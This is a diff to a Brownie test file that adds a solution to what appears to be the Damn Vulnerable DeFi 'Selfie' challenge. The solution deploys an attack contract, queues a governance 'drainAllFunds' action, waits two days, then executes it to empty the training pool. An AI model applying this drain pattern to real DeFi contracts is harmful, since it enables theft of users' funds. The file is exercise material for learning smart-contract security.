@@ -1,5 +1,5 @@
-from brownie import (accounts, Wei, SelfiePool,
-                     SimpleGovernance, DamnValuableTokenSnapshot)
+from brownie import (accounts, chain, Wei, SelfiePool,
+                     SimpleGovernance, DamnValuableTokenSnapshot, AttackSelfiePool)
 
 
 TOKEN_INITIAL_SUPPLY = Wei("2000000 ether")
@@ -20,10 +20,17 @@ def test_selfie():
 
     token.transfer(pool.address, TOKENS_IN_POOL)
 
+    # ** CODE YOUR EXPLOIT HERE **
 
-# ** CODE YOUR EXPLOIT HERE **
+    # SOLUTION
+    attack_contract = AttackSelfiePool.deploy(
+        token.address, governance.address, pool.address, {"from": attacker})
+    attack_contract.attack(TOKENS_IN_POOL, {"from": attacker})
 
+    # "drainAllFunds" is now queued, lets wait 2 days to execute the governance action
+    chain.sleep(2*24*60*60)
+    governance.executeAction(1, {"from": attacker})
 
-# ** SUCCESS CONDITIONS **
+    # ** SUCCESS CONDITIONS **
 
-assert token.balanceOf(attacker) == TOKENS_IN_POOL
+    assert token.balanceOf(attack_contract) == TOKENS_IN_POOL
